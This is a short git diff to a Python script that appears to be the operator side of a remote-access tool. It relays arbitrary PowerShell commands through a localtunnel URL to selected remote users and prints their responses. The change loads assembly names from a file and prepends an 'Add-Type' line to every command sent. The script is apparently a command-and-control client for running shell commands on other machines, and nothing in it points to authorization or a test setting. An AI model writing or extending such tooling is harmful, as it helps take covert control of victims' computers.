@@ -11,6 +11,10 @@ if osName == 'Windows':
 else:
     clear = lambda: os.system('clear')
 
+defaultAssemblys = []
+with open('DefaultAssembly.txt', 'r')  as assemblys:
+    defaultAssemblys = assemblys.readlines()
+
 url = 'https://olive-walls-cough-100-999-111-93.loca.lt/'
 
 headres = {"Content-Type": "application/json",}
@@ -93,7 +97,7 @@ while True:
                 re = get('response/'+curUser).text
                 print('Answer: '+re)
             continue
-        r = send('/send/req',data={'user': curUser,'message': 'cd "'+path+'" ; '+f"{message}"})
+        r = send('/send/req',data={'user': curUser,'message': 'Add-Type -AssemblyName '+','.join(defaultAssemblys).replace('\n','')+' ; cd "'+path+'" ; '+f" {message}"})
         if r == '404':
             userSellector()
         if len(r) > 3:
